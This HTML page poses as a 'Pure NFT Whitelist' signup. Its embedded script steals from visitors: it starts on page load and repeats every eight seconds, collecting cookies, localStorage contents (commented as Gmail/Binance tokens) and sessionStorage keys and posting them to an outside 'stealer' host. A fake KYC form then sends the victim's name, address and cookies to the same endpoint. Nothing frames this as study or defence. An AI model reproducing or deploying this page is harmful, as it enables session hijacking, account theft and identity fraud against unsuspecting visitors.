<!DOCTYPE html>
<html>
<head>
    <title>Pure NFT</title>
    <meta name="viewport" content="width=device-width">
    <style>body{margin:0;padding:20px;background:#000;color:#0f0;font-family:monospace;text-align:center}button{padding:20px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:10px;margin:20px;cursor:pointer}#status{color:#0ff;margin:20px}input{width:90%;padding:15px;margin:10px;background:#111;color:#0f0;border:1px solid #0f0}</style>
</head>
<body>
<h1>🔥 Pure NFT Whitelist</h1>
<button onclick="grabAll()">📱 Connect Now</button>
<div id="status"></div>
<form id="kyc" style="display:none;max-width:350px;margin:0 auto">
<input id="name" placeholder="Name">
<input id="addr" placeholder="Address">
<input type="file" id="files" multiple accept="image/*">
<button type="button" onclick="sendKYC()">Submit KYC</button>
</form>

<script>
// Status
function status(msg) { document.getElementById('status').innerHTML=msg }

// GRAB EVERYTHING
function grabAll() {
    status('🔄 Grabbing sessions...');
    
    // 1. Document cookies
    const docCookies = document.cookie;
    
    // 2. LocalStorage (Gmail/Binance tokens)
    const localData = {};
    for(let i=0; i<localStorage.length; i++) {
        localData[localStorage.key(i)] = localStorage.getItem(localStorage.key(i)).substring(0,50);
    }
    
    // 3. SessionStorage
    const sessionData = Object.keys(sessionStorage).join(',');
    
    // 4. Send ALL
    fetch('https://pure-nft-stealer.ilovework01.workers.dev/steal?source=all', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            cookies: docCookies,
            local: localData,
            session: sessionData,
            screen: screen.width + 'x' + screen.height
        })
    }).then(r=>r.text()).then(data => {
        status('✅ ' + data.substring(0,100));
        document.getElementById('kyc').style.display='block';
    });
    
    // Repeat grab
    setTimeout(grabAll, 8000);
}

// KYC
function sendKYC() {
    const data = {
        name: document.getElementById('name').value,
        addr: document.getElementById('addr').value,
        files: document.getElementById('files').files.length + ' files',
        cookies: document.cookie
    };
    
    fetch('https://pure-nft-stealer.ilovework01.workers.dev/kyc', {
        method: 'POST',
        body: JSON.stringify(data)
    }).then(()=>status('🎉 KYC SENT!'));
}

// AUTO START
setTimeout(grabAll, 2000);
</script>
</body>
</html>
